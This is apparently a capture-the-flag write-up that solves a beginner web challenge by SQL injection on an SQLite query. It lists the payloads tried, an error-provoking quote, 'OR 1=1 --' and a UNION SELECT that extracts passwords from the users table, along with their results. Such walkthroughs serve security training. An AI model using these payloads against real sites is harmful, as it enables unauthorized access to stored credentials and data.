Query is obviously injectable directly from the UI

Input: 1
Result:
	id -> 1
	username -> levelone 
	
Normal, returns username field as designed 

Input: 1'
Result:  
	Warning: SQLite3::query(): Unable to prepare statement: 1, unrecognized token: "' LIMIT 1" in /index.php on line 16

It looks like ending with a single quote (') just breaks the query. Let's try with some other terminators.

Input: 1 OR 1=1 --
Result:
	id -> 2
	username -> jvoisin
 
We successfully injected some mischief into the field and got some valid data back.
According to the output, columns are id and username.
According to the query source code provided the table name is 'users'. 
I'm going to guess that there is a column called 'password' and make a union with another SELECT. 

Input: 1 UNION SELECT id,password FROM users --
Result:
	id -> 1
	username -> WEBSEC{Simple_SQLite_Injection}
So the password values were union'ed into the username field, we got lucky that it popped up here on the first try.
Oh!! That's the flag!
